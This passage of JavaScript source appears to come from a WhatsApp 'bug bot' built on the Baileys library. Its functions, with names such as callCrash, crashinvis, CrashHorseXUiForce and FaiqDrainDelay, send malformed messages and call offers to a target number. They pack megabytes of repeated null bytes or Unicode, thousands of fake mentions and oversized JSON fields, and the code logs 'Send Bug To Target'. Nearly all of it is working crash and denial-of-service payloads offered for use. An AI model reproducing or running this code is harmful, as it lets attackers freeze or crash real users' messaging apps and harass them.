      : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

    let { id: meId, lid: meLid } = sock.authState.creds.me;
    let omak = meLid ? jidDecode(meLid)?.user : null;
    let shouldIncludeDeviceIdentity = false;

    let nodes = await Promise.all(
      participateNode.map(async ({ recipientJid: jid, message: msg }) => {

        let { user: targetUser } = jidDecode(jid);
        let { user: ownPnUser } = jidDecode(meId);
        let isOwnUser = targetUser === ownPnUser || targetUser === omak;
        let y = jid === meId || jid === meLid;

        if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

        let bytes = MessageDelete(encodeBuffer ? encodeBuffer(msg) : encodeWAMessage(msg));

        return AudioLite.mutex(jid, async () => {
          let { type, ciphertext } = await sock.signalRepository.encryptMessage({ jid, data: bytes });
          if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;

          return {
            tag: 'to',
            attrs: { jid },
            content: [{
              tag: 'enc',
              attrs: { v: '2', type, ...extraAttrs },
              content: ciphertext
            }]
          };
        });

      })
    );

    return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
  };

  let BytesType = crypto.randomBytes(32);
  let nodeEncode = Buffer.concat([BytesType, Buffer.alloc(8, 0x01)]);

  let { nodes: destinations, shouldIncludeDeviceIdentity } =
    await sock.createParticipantNodes(
      devices,
      { conversation: "y" },
      { count: '0' }
    );

  let DecodeCall = {
    tag: "call",
    attrs: {
      to: target,
      id: sock.generateMessageTag(),
      from: sock.user.id
    },
    content: [{
      tag: "offer",
      attrs: {
        "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
        "call-creator": sock.user.id
      },
      content: [
        { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
        { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
        { tag: "net", attrs: { medium: "3" } },
        {
          tag: "capability",
          attrs: { ver: "1" },
          content: new Uint8Array([1, 5, 247, 9, 228, 250, 1])
        },
        { tag: "encopt", attrs: { keygen: "2" } },
        { tag: "destination", attrs: {}, content: destinations },

        ...(shouldIncludeDeviceIdentity ? [{
          tag: "device-identity",
          attrs: {},
          content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
        }] : [])
      ]
    }]
  };
  await sock.sendNode(DecodeCall);
  const TextMsg = generateWAMessageFromContent(target, {
    extendedTextMessage: {
      text: "X",
      contextInfo: {
        remoteJid: "X",
        participant: target,
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      }
    }
  }, {});

  await sock.relayMessage(target, TextMsg.message, { messageId: TextMsg.key.id });
  await sock.sendMessage(target, { delete: TextMsg.key });
}

async function CloverInvisibleV1(target, payment = true) {
  const generateMentions = (count = 500) => {
    return [
      "0@s.whatsapp.net",
      ...Array.from({ length: count }, () =>
        "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
      )
    ];
  };

  let mentionList = generateMentions(50);
  let aksara = "ꦀ".repeat(3000) + "\n" + "ꦂ‎".repeat(3000);
  let parse = true;
  let SID = "5e03e0&mms3";
  let key = "10000000_2012297619515179_5714769099548640934_n.enc";
  let type = `image/webp`;

  if (11 > 9) {
    parse = parse ? false : true;
  }

  const X = {
    musicContentMediaId: "589608164114571",
    songId: "870166291800508",
    author: "X" + "ោ៝".repeat(10000),
    title: "XxX",
    artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
    artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
    countryBlocklist: true,
    isExplicit: true,
    artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
  };

  const DataMaklo = [
    {
      ID: "68917910",
      uri: "t62.43144-24/10000000_2203140470115547_947412155165083119_n.enc?ccb=11-4&oh",
      buffer: "11-4&oh=01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe",
      sid: "5e03e0",
      SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
      ENCSHA256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
      mkey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
    },
    {
      ID: "68884987",
      uri: "t62.43144-24/10000000_1648989633156952_6928904571153366702_n.enc?ccb=11-4&oh",
      buffer: "B01_Q5Aa1wH1Czc4Vs-HWTWs_i_qwatthPXFNmvjvHEYeFx5Qvj34g&oe",
      sid: "5e03e0",
      SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
      ENCSHA256: "25fgJU2dia2Hhmtv1orOO+9KPyUTlBNgIEnN9Aa3rOQ=",
      mkey: "lAMruqUomyoX4O5MXLgZ6P8T523qfx+l0JsMpBGKyJc=",
    },
  ];
  let sequentialIndex = 0;
  console.log(chalk.red(`Sukses Send Bug ${target}`));
  const kontolLah = DataMaklo[sequentialIndex];
  sequentialIndex = (sequentialIndex + 1) % DataMaklo.length;

  const { ID, uri, buffer, sid, SHA256, ENCSHA256, mkey } = kontolLah;

  const msg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/${uri}=${buffer}=${ID}&_nc_sid=${sid}&mms3=true`,
          fileSha256: SHA256,
          fileEncSha256: ENCSHA256,
          mediaKey: mkey,
          mimetype: "image/webp",
          directPath: `/v/${uri}=${buffer}=${ID}&_nc_sid=${sid}`,
          fileLength: { low: Math.floor(Math.random() * 1000), high: 0, unsigned: true },
          mediaKeyTimestamp: { low: Math.floor(Math.random() * 1700000000), high: 0, unsigned: false },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  }, {});
  await sock.relayMessage(
    target,
    { groupStatusMessageV2: { message: msg.message } },
    { messageId: msg.key.id }
  );
  let msgA = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            contextInfo: {
              remoteJid: " X ",
              mentions: Array.from(
                { length: 2000 },
                () => "1" + Math.floor(Math.random() * 5000000) + "@.s.whatsapp.net"
              ),
              isForwarded: true,
              fromMe: false,
              forwardingScore: 9999,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363422445860082@newsletter",
                serverMessageId: 1,
                newsletterName: ""
              }
            },
            body: { text: "X", format: "DEFAULT" },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\x10".repeat(1000000),
              version: 3
            }
          }
        }
      }
    },
    { participant: { jid: target } }
  );

  await sock.relayMessage(
    target,
    { groupStatusMessageV2: { message: msgA.message } },
    { messageId: msgA.key.id }
  );

  await new Promise(resolve => setTimeout(resolve, 3000));
}

async function NovaForclose(sock, jid) {
    let devices = (
        await sock.getUSyncDevices([jid], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

    await sock.assertSessions(devices);

    let xnxx = () => {
        let map = {};
        return {
            mutex(key, fn) {
                map[key] ??= { task: Promise.resolve() };
                map[key].task = (async prev => {
                    try { await prev; } catch { }
                    return fn();
                })(map[key].task);
                return map[key].task;
            }
        };
    };

    let memek = xnxx();
    let bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
    let porno = sock.createParticipantNodes.bind(sock);
    let yntkts = sock.encodeWAMessage?.bind(sock);

    sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
        if (!recipientJids.length)
            return { nodes: [], shouldIncludeDeviceIdentity: false };

        let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);
        let ywdh = Array.isArray(patched)
            ? patched
            : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

        let { id: meId, lid: meLid } = sock.authState.creds.me;
        let omak = meLid ? jidDecode(meLid)?.user : null;
        let shouldIncludeDeviceIdentity = false;

        let nodes = await Promise.all(
            ywdh.map(async ({ recipientJid: jid, message: msg }) => {

                let { user: targetUser } = jidDecode(jid);
                let { user: ownPnUser } = jidDecode(meId);

                let isOwnUser = targetUser === ownPnUser || targetUser === omak;
                let y = jid === meId || jid === meLid;

                if (dsmMessage && isOwnUser && !y)
                    msg = dsmMessage;

                let bytes = bokep(yntkts ? yntkts(msg) : encodeWAMessage(msg));

                return memek.mutex(jid, async () => {
                    let { type, ciphertext } = await sock.signalRepository.encryptMessage({
                        jid,
                        data: bytes
                    });

                    if (type === 'pkmsg')
                        shouldIncludeDeviceIdentity = true;

                    return {
                        tag: 'to',
                        attrs: { jid },
                        content: [{
                            tag: 'enc',
                            attrs: { v: '2', type, ...extraAttrs },
                            content: ciphertext
                        }]
                    };
                });
            })
        );

        return {
            nodes: nodes.filter(Boolean),
            shouldIncludeDeviceIdentity
        };
    };

    let awik = crypto.randomBytes(32);
    let awok = Buffer.concat([awik, Buffer.alloc(8, 0x01)]);

    let {
        nodes: destinations,
        shouldIncludeDeviceIdentity
    } = await sock.createParticipantNodes(
        devices,
        { conversation: "y" },
        { count: '0' }
    );

    let expensionNode = {
        tag: "call",
        attrs: {
            to: jid,
            id: sock.generateMessageTag(),
            from: sock.user.id
        },
        content: [{
            tag: "offer",
            attrs: {
                "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
                "call-creator": sock.user.id
            },
            content: [
                { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
                {
                    tag: "video",
                    attrs: {
                        orientation: "0",
                        screen_width: "1920",
                        screen_height: "1080",
                        device_orientation: "0",
                        enc: "vp8",
                        dec: "vp8"
                    }
                },
                { tag: "net", attrs: { medium: "3" } },
                { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
                { tag: "encopt", attrs: { keygen: "2" } },
                { tag: "destination", attrs: {}, content: destinations },
                ...(shouldIncludeDeviceIdentity
                    ? [{
                        tag: "device-identity",
                        attrs: {},
                        content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
                    }]
                    : []
                )
            ]
        }]
    };

    let Nova = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    messageSecret: crypto.randomBytes(32),
                    supportPayload: JSON.stringify({
                        version: 3,
                        is_ai_message: true,
                        should_show_system_message: true,
                        ticket_id: crypto.randomBytes(16)
                    })
                },
                intwractiveMessage: {
                    body: {
                        text: 'Sanzyy Nova'
                    },
                    footer: {
                        text: 'Sanzyy Nova'
                    },
                    carouselMessage: {
                        messageVersion: 1,
                        cards: [{
                            header: {
                                stickerMessage: {
                                    url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
                                    fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
                                    fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
                                    mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
                                    mimetype: "image/webp",
                                    directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
                                    fileLength: { low: 1, high: 0, unsigned: true },
                                    mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
                                    firstFrameLength: 19904,
                                    firstFrameSidecar: "KN4kQ5pyABRAgA==",
                                    isAnimated: true,
                                    isAvatar: false,
                                    isAiSticker: false,
                                    isLottie: false,
                                    contextInfo: {
                                        mentionedJid: jid
                                    }
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: 'Sanzyy — Nova'
                            },
                            footer: {
                                text: 'Sanzyy — Nova'
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "\n".repeat(10000)
                            },
                            contextInfo: {
                                id: sock.generateMessageTag(),
                                forwardingScore: 999,
                                isForwarding: true,
                                participant: "0@s.whatsapp.net",
                                remoteJid: "X",
                                mentionedJid: ["0@s.whatsapp.net"]
                            }
                        }]
                    }
                }
            }
        }
    };

    await sock.relayMessage(jid, Nova, {
        messageId: null,
        participant: { jid: jid },
        userJid: jid
    });

    await sock.sendNode(expensionNode);
}

async function callCrash(sock, target, isVideo = false) {
  const { jidDecode, encodeWAMessage, encodeSignedDeviceIdentity } = require("baileys");
  
  try {
    const devices = (
      await sock.getUSyncDevices([target], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

    await sock.assertSessions(devices);

    const createMutex = () => {
      const locks = new Map();
      
      return {
        async mutex(key, fn) {
          while (locks.has(key)) {
            await locks.get(key);
          }
          
          const lock = Promise.resolve().then(() => fn());
          locks.set(key, lock);
          
          try {
            const result = await lock;
            return result;
          } finally {
            locks.delete(key);
          }
        }
      };
    };

    const mutexManager = createMutex();
    
    const appendBufferMarker = (buffer) => {
      const newBuffer = Buffer.alloc(buffer.length + 8);
      buffer.copy(newBuffer);
      newBuffer.fill(1, buffer.length);
      return newBuffer;
    };

    const originalCreateParticipantNodes = sock.createParticipantNodes?.bind(sock);
    const originalEncodeWAMessage = sock.encodeWAMessage?.bind(sock);

    sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
      if (!recipientJids.length) {
        return {
          nodes: [],
          shouldIncludeDeviceIdentity: false
        };
      }

      const processedMessage = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);
      
      const messagePairs = Array.isArray(processedMessage) 
        ? processedMessage 
        : recipientJids.map(jid => ({ recipientJid: jid, message: processedMessage }));

      const { id: meId, lid: meLid } = sock.authState.creds.me;
      const localUser = meLid ? jidDecode(meLid)?.user : null;
      let shouldIncludeDeviceIdentity = false;

      const nodes = await Promise.all(
        messagePairs.map(async ({ recipientJid: jid, message: msg }) => {
          const { user: targetUser } = jidDecode(jid);
          const { user: ownUser } = jidDecode(meId);
          const isOwnUser = targetUser === ownUser || targetUser === localUser;
          const isSelf = jid === meId || jid === meLid;
          
          if (dsmMessage && isOwnUser && !isSelf) {
            msg = dsmMessage;
          }

          const encodedBytes = appendBufferMarker(
            originalEncodeWAMessage 
              ? originalEncodeWAMessage(msg) 
              : encodeWAMessage(msg)
          );

          return mutexManager.mutex(jid, async () => {
            const { type, ciphertext } = await sock.signalRepository.encryptMessage({ 
              jid, 
              data: encodedBytes 
            });
            
            if (type === 'pkmsg') {
              shouldIncludeDeviceIdentity = true;
            }
            
            return {
              tag: 'to',
              attrs: { jid },
              content: [{
                tag: 'enc',
                attrs: {
                  v: '2',
                  type,
                  ...extraAttrs
                },
                content: ciphertext
              }]
            };
          });
        })
      );

      return {
        nodes: nodes.filter(Boolean),
        shouldIncludeDeviceIdentity
      };
    };

    const callKey = crypto.randomBytes(32);
    const extendedCallKey = Buffer.concat([callKey, Buffer.alloc(8, 0x01)]);
    const callId = crypto.randomBytes(16).toString("hex").slice(0, 32).toUpperCase();

    const { nodes: destinations, shouldIncludeDeviceIdentity } = 
      await sock.createParticipantNodes(devices, { 
        conversation: "call-initiated"
      }, { count: '0' });

    const callStanza = {
      tag: "call",
      attrs: {
        to: target,
        id: sock.generateMessageTag(),
        from: sock.user.id
      },
      content: [{
        tag: "offer",
        attrs: {
          "call-id": callId,
          "call-creator": sock.user.id
        },
        content: [
          {
            tag: "audio",
            attrs: {
              enc: "opus",
              rate: "16000"
            }
          },
          {
            tag: "audio",
            attrs: {
              enc: "opus",
              rate: "8000"
            }
          },
          ...(isVideo ? [{
            tag: 'video',
            attrs: {
              enc: 'vp8',
              dec: 'vp8',
              orientation: '0',
              screen_width: '1920',
              screen_height: '1080',
              device_orientation: '0'
            }
          }] : []),
          {
            tag: "net",
            attrs: {
              medium: "3"
            }
          },
          {
            tag: "capability",
            attrs: { ver: "1" },
            content: new Uint8Array([1, 5, 247, 9, 228, 250, 1])
          },
          {
            tag: "encopt",
            attrs: { keygen: "2" }
          },
          {
            tag: "destination",
            attrs: {},
            content: destinations
          },
          ...(shouldIncludeDeviceIdentity ? [{
            tag: "device-identity",
            attrs: {},
            content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
          }] : [])
        ].filter(Boolean)
      }]
    };

    await sock.sendNode(callStanza);

  } catch (error) {
    console.error('Error in callCrash:', error);
    throw error;
  }
}

async function crashinvis(sock, target, mention = true) {
  const ButtonMsg = {
    buttonsMessage: {
      text: "\u0000",
      contentText: "Zuxy - Executor !",
      footerText: "\n",
      buttons: [
        {
          buttonId: ".exe",
          buttonText: {
            displayText: "ી" + "\u0000".repeat(800000),
          },
          type: 1,
        },
      ],
      headerType: 1,
    },
  };

  const msg = await generateWAMessageFromContent(target, ButtonMsg, {});

  await sock.relayMessage("status@broadcast",
    msg.message,
    {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined,
                },
              ],
            },
          ],
        },
      ],
    }
  );

  if (mention) {
    await sock.relayMessage(target, {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "\u0000".repeat(2000) },
            content: undefined,
          },
        ],
      }
    );
  }
}

async function CrashHorseXUiForce(target) {
const message = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "Faiq Crash 🩸" + "\u200D".repeat(2000)
          },
          carouselMessage: {
            cards: [
              {
                header: {
                  ...(await prepareWAMessageMedia({
                    image: { url: "https://img1.pixhost.to/images/6002/603813009_rizzhosting.jpg" }
                  }, {
                    upload: sock.waUploadToServer
                  })),
                  title: "Faiq Crash 🩸",
                  gifPlayback: true,
                  subtitle: "Faiq Crash 🩸",
                  hasMediaAttachment: true
                },
                body: {
                  text: "Faiq Crash 🩸" + "ꦾ".repeat(120000)
                },
                footer: {
                  text: "Faiq Crash 🩸"
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "single_select",
                      buttonParamsJson: JSON.stringify({
                        title: "",
                        sections: []
                      })
                    },
                    {
                      name: "single_select",
                      buttonParamsJson: JSON.stringify({
                        title: "𑲭𑲭".repeat(60000),
                        sections: [
                          {
                            title: " i wanna be kill you ",
                            rows: []
                          }
                        ]
                      })
                    },
                    { name: "call_permission_request", buttonParamsJson: "{}" },
                    { name: "mpm", buttonParamsJson: "{}" },
                    {
                      name: "single_select",
                      buttonParamsJson: JSON.stringify({
                        title: "Faiq Crash 🩸",
                        sections: [
                          {
                            title: "Faiq Crash 🩸",
                            highlight_label: "💥",
                            rows: [
                              { header: "", title: "💧", id: "⚡" },
                              { header: "", title: "💣", id: "✨" }
                            ]
                          }
                        ]
                      })
                    },
                    {
                      name: "quick_reply",
                      buttonParamsJson: JSON.stringify({
                        display_text: "Quick Crash Reply",
                        id: "📌"
                      })
                    },
                    {
                      name: "cta_url",
                      buttonParamsJson: JSON.stringify({
                        display_text: "Developed",
                        url: "https://t.me/Whhwhahwha",
                        merchant_url: "https://t.mw/Whhwhahwha"
                      })
                    },
                    {
                      name: "cta_call",
                      buttonParamsJson: JSON.stringify({
                        display_text: "Call Us Null",
                        id: "message"
                      })
                    },
                    {
                      name: "cta_copy",
                      buttonParamsJson: JSON.stringify({
                        display_text: "Copy Crash Code",
                        id: "message",
                        copy_code: "#CRASHCODE9741"
                      })
                    },
                    {
                      name: "cta_reminder",
                      buttonParamsJson: JSON.stringify({
                        display_text: "Set Reminder Crash",
                        id: "message"})
                    },
                    {
                      name: "cta_cancel_reminder",
                      buttonParamsJson: JSON.stringify({
                        display_text: "Cancel Reminder Crash",
                        id: "message"
                      })
                    },
                    {
                      name: "address_message",
                      buttonParamsJson: JSON.stringify({
                        display_text: "Send Crash Address",
                        id: "message"
                      })
                    },
                    {
                      name: "send_location",
                      buttonParamsJson: "Faiq Crash 🩸"
                    }
                  ]
                }
              }
            ],
            messageVersion: 1
          }
        }
      }
    }
  }, {
  });

  await sock.relayMessage(target, message.message, {
    messageId: message.key.id
  });

  console.log("Send Bug To Target");
}

async function FaiqDrainDelay(sock, target) {
const Msg1 = {
   ephemeralMessage: {
            message: {
                viewOnceMessage: {
                    message: {
                        interactiveResponseMessage: {
                            body: {
                                text: "Faiq Crash Is The Winner 𑜦𑜠".repeat(20000),
                                format: "DEFAULT",
                            },
                            contextInfo: {
                                mentionedJid: [
                                    ...Array.from({ length: 1999 }, () => "1" + Math.floor(Math.random() * 5000000) + "917267@s.whatsapp.net"),
                                ],
                                isForwarded: true,
                                forwadingScore: 999,
                                forwardedNewsletterMessageInfo: {
                                    newsletterJid: "696969696969@newsletter",
                                    serverMessageId: 1,
                                    newsletterName: "Faiq - Glorrr Crash",
                                }
                            },
                            nativeFlowResponseMessage: {
                                name: "galaxy_message",
                                paramsJson: "{}".repeat(30000),
                                version: 3
                            }
                        }
                    }
                }
            }
        }
    }; 
   const Msg2 = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Faiq - Bronze Low",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            buttonParamsJson: "\u0000".repeat(12000),
            version: 3
          }
        }
      }
    }
  };
  const LordGlor = {
    viewOnceMessage: {
      message: {
        extendedTextMessage: {
          text: "ꦾ".repeat(14000),
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () =>
                `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
              )
            ]
          }
        }
      }
    }
  };
  const Glorrr3 = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_573578875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/webp",
          fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
          fileLength: "1173741824",
          mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
          fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
          directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
          mediaKeyTimestamp: "1743225419",
          isAnimated: false,
          viewOnce: false,
          contextInfo: {
            mentionedJid: [
              target,
              ...Array.from({ length: 1900 }, () =>
                `92${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
              )
            ],
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9999,
            isForwarded: true,
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: { text: "Faiq - Jembut Glorr", format: "DEFAULT" },
                    nativeFlowResponseMessage: {
                      name: "call_permission_request",
                      paramsJson: "\u0000".repeat(99999),
                      version: 3
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  };
  const Glorr4 = {
      viewOnceMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc",
            isAnimated: true,
            stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
            isAvatar: false,
            isAiSticker: false,
            isLottie: false
          }
        }
      }
    };
  for (const msg of [Msg1, Msg2, LordGlor, Glorrr3, Glorr4]) {
    await sock.relayMessage("status@broadcast", msg.message ?? msg, {
      messageId: msg.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target } }]
            }
          ]
        }
      ]
    });
  }
}

async function NativeflowDelay(client, target) {
  const msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "᬴᬴᬴".repeat(5000),
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\u0000".repeat(1045000),
              version: 3
            },
            contextInfo: {
              entryPointConversionSource: "call_permission_request"
            }
          }
        }
      }
    },
    {}
  )

  await client.relayMessage(target, { groupStatusMessageV2: { message: msg.message } }, {
    participant: { jid: target }
    });
}

async function FaiqDelayInvis(sock, target) {

let etc = generateWAMessageFromContent(target, {
viewOnceMessage: {
  message: {
    interactiveResponseMessage: {
      body: {
        text: "Faiq Crash 🩸", 
        format: "EXTENTION_1"
      }, 
      contextInfo: {
        mentionedJid: Array.from({ length:2000 }, (_, z) => `1313555020${z + 1}@s.whatsapp.net`), 
        statusAttributionType: "SHARED_FROM_MENTION"
      }, 
      nativeFlowResponseMessage: {
        name: "menu_options", 
        paramsJson: "{\"display_text\":\" 7eppeli - xrelly\",\"id\":\".grockk\",\"description\":\"xrl with yuukey?....\"}", 
        version: "3"
        }
      }
    }
  }
}, {})

let biji2 = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "Faiq Crash 🩸",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\x10".repeat(1045000),
              version: 3,
            },
            entryPointConversionSource: "call_permission_request",
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background:
        "#" +
        Math.floor(Math.random() * 16777215)
          .toString(16)
          .padStart(6, "99999999"),
    });
    
 let push = [];
  push.push({
    body: proto.Message.InteractiveMessage.Body.fromObject({ text: "Faiq Crash 🩸" }),
    footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: "Faiq Crash 🩸" }),
    header: proto.Message.InteractiveMessage.Header.fromObject({
      title: "Faiq Crash 🩸",
      hasMediaAttachment: true,
      imageMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "88J5mAdmZ39jShlm5NiKxwiGLLSAhOy0gIVuesjhPmA=",
        fileLength: "18352",
        height: 720,
        width: 1280,
        mediaKey: "Te7iaa4gLCq40DVhoZmrIqsjD+tCd2fWXFVl3FlzN8c=",
        fileEncSha256: "w5CPjGwXN3i/ulzGuJ84qgHfJtBKsRfr2PtBCT0cKQQ=",
        directPath: "/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1737281900",
        jpegThumbnail:
          "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACgASAMBIgACEQEDEQH/xAAsAAEBAQEBAAAAAAAAAAAAAAAAAwEEBgEBAQEAAAAAAAAAAAAAAAAAAAED/9oADAMBAAIQAxAAAADzY1gBowAACkx1RmUEAAAAAA//xAAfEAABAwQDAQAAAAAAAAAAAAARAAECAyAiMBIUITH/2gAIAQEAAT8A3Dw30+BydR68fpVV4u+JF5RTudv/xAAUEQEAAAAAAAAAAAAAAAAAAAAw/9oACAECAQE/AH//xAAWEQADAAAAAAAAAAAAAAAAAAARIDD/2gAIAQMBAT8Acw//2Q==",
        scansSidecar: "hLyK402l00WUiEaHXRjYHo5S+Wx+KojJ6HFW9ofWeWn5BeUbwrbM1g==",
        scanLengths: [3537, 10557, 1905, 2353],
        midQualityFileSha256: "gRAggfGKo4fTOEYrQqSmr1fIGHC7K0vu0f9kR5d57eo=",
      },
    }),
    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
